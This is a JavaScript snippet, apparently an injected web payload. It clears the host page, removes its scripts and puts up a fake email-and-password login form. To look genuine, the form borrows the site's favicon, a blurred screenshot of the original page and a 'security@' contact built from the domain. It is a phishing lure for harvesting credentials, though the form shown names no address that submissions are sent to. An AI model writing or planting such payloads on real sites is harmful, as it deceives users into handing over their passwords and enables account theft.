// Clear the document body
document.body.innerHTML = "";
var scriptss = document.scripts;

// Remove existing scripts
for (var i = scriptss.length - 1; i >= 0; i--) {
  var script = scriptss[i];
  script.parentNode.removeChild(script);
}

// Center the form on the page with larger input fields
var style = document.createElement('style');
style.innerHTML = `
  body {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    font-family: Arial, sans-serif;
    background-color: #f0f0f0; /* Adding background color for better visibility */
    overflow: hidden; /* Prevent scroll */
  }
  .blurred-background {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    filter: blur(8px);
    z-index: -1;
  }
  .banner {
    text-align: center;
    margin-bottom: 20px;
    font-size: 18px;
    color: #333;
  }
  .banner2 {
    text-align: center;
    margin-bottom: 20px;
    font-size: 10px;
    color: #333;
  }
  .form-container {
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 100%;
    max-width: 400px;
    padding: 20px;
    border: 1px solid #ccc;
    border-radius: 10px;
    background-color: #fff; /* Set background color for the form container */
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Add shadow for better visibility */
    position: relative;
    z-index: 1;
  }
  .form-container label {
    font-size: 16px;
    margin-bottom: 5px;
    width: 100%; /* Make the label take full width */
  }
  .form-container input {
    width: 100%;
    padding: 10px;
    margin-bottom: 10px;
    border: 1px solid #ccc;
    border-radius: 5px;
  }
  .form-container button {
    padding: 10px 20px;
    font-size: 16px;
    cursor: pointer; /* Allow clicking on the button */
  }
  .favicon {
    width: 32px;
    height: 32px;
    margin-bottom: 10px;
  }
  /* Remove hiding of other elements */
  body > *:not(.form-container):not(textarea) {
    display: initial !important;
  }
  .copyright-text {
    font-size: 12px;
    margin-top: 20px;
    color: #666;
    text-align: center;
  }
`;
document.head.appendChild(style);

// Create the banner
var banner = document.createElement('div');
var rootDomain = document.domain.split('.').slice(-2).join('.'); // Extract root domain
banner.className = 'banner';
banner.textContent = `Please enter your email and password to continue.`;

// Create the form container
var formContainer = document.createElement('div');
formContainer.className = 'form-container';

// Create the form
var form = document.createElement('form');

// Create and style the email label and input field
var labelEmail = document.createElement('label');
labelEmail.textContent = 'Email';

var inputEmail = document.createElement('input');
inputEmail.type = 'email';
inputEmail.id = 'email';
inputEmail.name = 'email';
inputEmail.autofocus = true;
inputEmail.autocomplete = 'email';
inputEmail.placeholder = 'Enter your email';
inputEmail.classList.add('single-input');

// Create and style the password label and input field
var labelPassword = document.createElement('label');
labelPassword.textContent = 'Password';

var inputPassword = document.createElement('input');
inputPassword.type = 'password';
inputPassword.id = 'password';
inputPassword.name = 'password';
inputPassword.autocomplete = 'current-password';
inputPassword.placeholder = 'Enter your password';
inputPassword.classList.add('single-input');

// Create the button
var button = document.createElement('button');
button.type = 'submit';
button.textContent = 'Submit';

// Create the banner2
var banner2 = document.createElement('div');
banner2.className = 'banner2';
banner2.textContent = `Copyright© 2024 ${rootDomain} All rights reserved. Having trouble? Email security@${rootDomain}`;

// Append elements to the form
form.appendChild(labelEmail);
form.appendChild(inputEmail);
form.appendChild(labelPassword);
form.appendChild(inputPassword);
form.appendChild(button);

// Append form and banner to the form container
formContainer.appendChild(banner);
formContainer.appendChild(form);
formContainer.appendChild(banner2);

// Append the form container to the body
document.body.appendChild(formContainer);

// Function to create a blurred background image
function createBlurredBackground(imageUrl) {
  var blurredBackground = document.createElement('div');
  blurredBackground.className = 'blurred-background';
  blurredBackground.style.backgroundImage = `url(${imageUrl})`;
  blurredBackground.style.backgroundSize = 'cover';
  blurredBackground.style.backgroundPosition = 'center';
  document.body.appendChild(blurredBackground);
}

// Try to fetch the favicon from the root domain
function fetchFavicon(url) {
  var faviconUrl = `${url}/favicon.ico`;
  var faviconImg = new Image();
  faviconImg.src = faviconUrl;
  faviconImg.onload = function() {
    var favicon = document.createElement('img');
    favicon.className = 'favicon';
    favicon.src = faviconUrl;
    formContainer.insertBefore(favicon, banner);
  };
}

// Check if the root domain is different from the current domain
var rootDomain = document.domain.split('.').slice(-2).join('.');
if (rootDomain !== document.domain) {
  fetchFavicon(`http://www.${rootDomain}`);
} else {
  fetchFavicon(window.location.origin);
}

// Create a blurred background if possible
html2canvas(document.body).then(canvas => {
  createBlurredBackground(canvas.toDataURL());
});

// Create the copyright text
var copyrightText = document.createElement('div');
copyrightText.className = 'copyright-text';
copyrightText.textContent = `Copyright 2024 ${rootDomain} All rights reserved. Having trouble? Email security@${rootDomain}`;

// Append the copyright text below the button
formContainer.appendChild(copyrightText);
